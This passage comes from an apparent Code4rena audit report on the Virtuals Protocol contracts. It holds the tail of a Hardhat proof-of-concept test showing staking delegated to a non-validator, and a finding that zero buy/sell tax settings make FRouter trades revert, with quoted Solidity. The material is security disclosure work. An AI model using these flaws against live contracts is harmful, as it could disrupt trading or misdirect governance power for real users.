<span class="grvsc-line"><span class="grvsc-source">      [</span></span>
<span class="grvsc-line"><span class="grvsc-source">        service.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        contribution.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentNft.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        1e12,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        20,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        ipVault.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentFactory.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        deployer.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        1e10,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      ]</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await minter.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`Minter deployed at ${minter.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Setting parameters on AgentFactory...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setMaturityDuration(86400 * 365 * 10); // 10years</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setUniswapRouter(process.env.UNISWAP_ROUTER);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setTokenAdmin(deployer.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setTokenSupplyParams(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_LIMIT,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_LP_SUPPLY,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_VAULT_SUPPLY,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_LIMIT,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_LIMIT,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.BOT_PROTECTION,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      minter.target</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setTokenTaxParams(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.TAX,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.TAX,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.SWAP_THRESHOLD,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      treasury.address</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("AgentFactory parameters set");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    return { virtualToken, agentFactory, agentNft, minter, tbaRegistry };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  async function deployWithApplication() {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const base = await deployBaseContracts();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { agentFactory, virtualToken, tbaRegistry } = base;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { founder } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Prepare tokens for proposal</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Minting VirtualToken for founder...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.mint(founder.address, PROPOSAL_THRESHOLD);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(founder)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .approve(agentFactory.target, PROPOSAL_THRESHOLD);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">console.log("Proposing agent...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tx = await agentFactory</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(founder)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .proposeAgent(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.name,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.symbol,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.tokenURI,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.cores,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.tbaSalt,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tbaRegistry.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.daoVotingPeriod,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.daoThreshold</span></span>
<span class="grvsc-line"><span class="grvsc-source">      );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">      await tx.wait();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const filter = agentFactory.filters.NewApplication;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const events = await agentFactory.queryFilter(filter, -1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const event = events[0];</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { id } = event.args;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`Agent application created with ID: ${id}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    return { applicationId: id, ...base };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  async function deployWithAgent() {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const base = await deployWithApplication();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { agentFactory, applicationId } = base;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { founder } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Executing application...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(founder)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .executeApplication(applicationId, false);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const factoryFilter = agentFactory.filters.NewPersona;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const factoryEvents = await agentFactory.queryFilter(factoryFilter, -1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const factoryEvent = factoryEvents[0];</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { virtualId, token, veToken, dao, tba, lp } = await factoryEvent.args;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`Agent created with virtualId: ${virtualId}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    return {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      ...base,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      agent: {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        virtualId,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        token,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        veToken,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        dao,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tba,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        lp,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      },</span></span>
<span class="grvsc-line"><span class="grvsc-source">    };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  before(async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Increase timeout for all tests</span></span>
<span class="grvsc-line"><span class="grvsc-source">    this.timeout(60000);</span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">it("Delegate a non-validator", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Need to provide LP first</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { agent, agentNft, virtualToken } = await loadFixture(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      deployWithAgent</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { trader, poorMan, founder, randomAddr } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const router = await ethers.getContractAt(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "IUniswapV2Router02",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.UNISWAP_ROUTER</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentToken = await ethers.getContractAt("AgentToken", agent.token);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Buy tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const amountToBuy = parseEther("10000000");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const capital = parseEther("200000000");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.mint(trader.address, capital);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(trader)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .approve(process.env.UNISWAP_ROUTER, capital);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    await router</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(trader)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .swapTokensForExactTokens(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        amountToBuy,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        capital,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        [virtualToken.target, agent.token],</span></span>
<span class="grvsc-line"><span class="grvsc-source">        trader.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        Math.floor(new Date().getTime() / 1000 + 600000)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ////</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Start providing liquidity</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const lpToken = await ethers.getContractAt("ERC20", agent.lp);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const veToken = await ethers.getContractAt("AgentVeToken", agent.veToken);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await veToken.connect(founder).setCanStake(true);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(await lpToken.balanceOf(trader.address)).to.be.equal(0n);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(trader)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .approve(process.env.UNISWAP_ROUTER, parseEther("10000000"));</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(trader)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .approve(process.env.UNISWAP_ROUTER, parseEther("10000000"));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    await router</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(trader)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .addLiquidity(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        virtualToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await agentToken.balanceOf(trader.address),</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await virtualToken.balanceOf(trader.address),</span></span>
<span class="grvsc-line"><span class="grvsc-source">        0,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        0,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        trader.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        Math.floor(new Date().getTime() / 1000 + 6000)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    /////////////////</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Staking, and able to delegate to anyone</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await lpToken.connect(trader).approve(agent.veToken, parseEther("100"));</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await expect(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      veToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .connect(trader)</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .stake(parseEther("10"), trader.address, poorMan.address)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ).to.be.not.reverted;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Delegate to someone else without adding to the addValidator</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await veToken.connect(trader).delegate(randomAddr);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Assert poorMan as a validator </span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(await agentNft.isValidator(agent.virtualId , poorMan.address)).to.be.eq(true);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Assert RandomAddress as not a validator</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(await agentNft.isValidator(agent.virtualId , randomAddr.address)).to.be.eq(false);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">});</span></span></code></pre>
</details>
<hr>
<h2 style="position:relative;" id="m-15-if-ffactorybuytax-and--or-ffactoryselltax-is-set-to-0-buy--sell-would-revert"><a class="anchor before" aria-label="m 15 if ffactorybuytax and  or ffactoryselltax is set to 0 buy  sell would revert permalink" href="#m-15-if-ffactorybuytax-and--or-ffactoryselltax-is-set-to-0-buy--sell-would-revert"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-55">[M-15] If <code>FFactory::buyTax</code> and / or <code>FFactory::sellTax</code> is set to 0, buy / sell would revert</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-546">YouCrossTheLineAlfie</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-727">NHristov</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L125">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L125</a></p>
<h3 style="position:relative;" id="finding-description-9"><a class="anchor before" aria-label="finding description 9 permalink" href="#finding-description-9"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FFactory.sol#L74"><code>FFactory::setTaxParams</code></a> can be called by the admin to change the <code>buyTax</code> and <code>sellTax</code>.</p>
<pre data-index="88" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// FFactory.sol</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setTaxParams</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">newVault_</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">buyTax_</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">sellTax_</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyRole</span><span class="mtk1">(</span><span class="mtk12">ADMIN_ROLE</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">newVault_</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Zero addresses are not allowed."</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">taxVault</span><span class="mtk1"> = </span><span class="mtk12">newVault_</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">buyTax</span><span class="mtk1"> = </span><span class="mtk12">buyTax_</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">sellTax</span><span class="mtk1"> = </span><span class="mtk12">sellTax_</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>This is used inside the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FRouter.sol#L131"><code>FRouter::buy</code></a> and <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FRouter.sol#L95"><code>FRouter::sell</code></a> to levy fees.</p>
<pre data-index="89" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// FRouter.sol</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">buy</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amountIn</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenAddress</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyRole</span><span class="mtk1">(</span><span class="mtk12">EXECUTOR_ROLE</span><span class="mtk1">) </span><span class="mtk11">nonReentrant</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">fee</span><span class="mtk1"> = </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">buyTax</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">txFee</span><span class="mtk1"> = (</span><span class="mtk12">fee</span><span class="mtk1"> * </span><span class="mtk12">amountIn</span><span class="mtk1">) / </span><span class="mtk7">100</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">feeTo</span><span class="mtk1"> = </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">taxVault</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1"> = </span><span class="mtk12">amountIn</span><span class="mtk1"> - </span><span class="mtk12">txFee</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">assetToken</span><span class="mtk1">).</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">pair</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">assetToken</span><span class="mtk1">).</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">feeTo</span><span class="mtk1">, </span><span class="mtk12">txFee</span><span class="mtk1">);          &lt;&lt;@ -- </span><span class="mtk3">// Fee sent to taxManager</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amountOut</span><span class="mtk1"> = </span><span class="mtk11">getAmountsOut</span><span class="mtk1">(</span><span class="mtk12">tokenAddress</span><span class="mtk1">, </span><span class="mtk12">assetToken</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IFPair</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">).</span><span class="mtk11">transferTo</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">amountOut</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IFPair</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">).</span><span class="mtk11">swap</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk12">amountOut</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">feeTo</span><span class="mtk1"> == </span><span class="mtk12">taxManager</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">IBondingTax</span><span class="mtk1">(</span><span class="mtk12">taxManager</span><span class="mtk1">).</span><span class="mtk11">swapForAsset</span><span class="mtk1">();         &lt;&lt;@ -- </span><span class="mtk3">// Swap for Asset call</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk12">amountOut</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<pre data-index="90" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// FRouter.sol</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">sell</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amountIn</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenAddress</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">nonReentrant</span><span class="mtk1"> </span><span class="mtk11">onlyRole</span><span class="mtk1">(</span><span class="mtk12">EXECUTOR_ROLE</span><span class="mtk1">) </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">fee</span><span class="mtk1"> = </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">sellTax</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">txFee</span><span class="mtk1"> = (</span><span class="mtk12">fee</span><span class="mtk1"> * </span><span class="mtk12">amountOut</span><span class="mtk1">) / </span><span class="mtk7">100</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1"> = </span><span class="mtk12">amountOut</span><span class="mtk1"> - </span><span class="mtk12">txFee</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">feeTo</span><span class="mtk1"> = </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">taxVault</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">transferAsset</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">transferAsset</span><span class="mtk1">(</span><span class="mtk12">feeTo</span><span class="mtk1">, </span><span class="mtk12">txFee</span><span class="mtk1">);                   &lt;&lt;@ -- </span><span class="mtk3">// Fee sent to taxManager</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
